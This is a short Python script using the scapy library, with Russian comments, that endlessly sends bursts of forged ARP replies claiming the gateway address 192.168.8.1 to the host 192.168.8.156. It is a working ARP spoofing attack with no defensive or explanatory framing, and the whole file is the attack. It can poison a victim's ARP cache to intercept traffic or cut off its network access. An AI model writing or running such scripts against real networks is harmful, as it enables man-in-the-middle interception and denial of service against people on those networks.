from scapy.all import ARP, send
import time

while True:
    print("еще сто")
    for _ in range(100):  # Отправляем 100 пакетов подряд без паузы
        arp_packet = ARP(op=2, psrc="192.168.8.1", pdst="192.168.8.156", hwdst="08:bf:b8:a7:15:2e")
        send(arp_packet, verbose=False)
